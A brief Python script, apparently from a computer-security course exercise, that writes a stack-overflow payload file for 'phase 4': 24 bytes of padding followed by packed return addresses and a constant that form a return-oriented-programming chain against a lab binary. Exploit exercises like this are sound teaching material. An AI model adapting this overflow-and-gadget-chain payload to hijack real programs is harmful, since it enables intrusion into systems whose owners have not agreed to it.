import struct

with open("phase4_payload.bin", "wb") as f:
    f.write(b"A" * 0x18)
    f.write(struct.pack("<q", 0x4019E7))
    f.write(struct.pack("<q", 0x3E52DFF5))
    f.write(struct.pack("<q", 0x4019F8))
    f.write(struct.pack("<q", 0x401879))
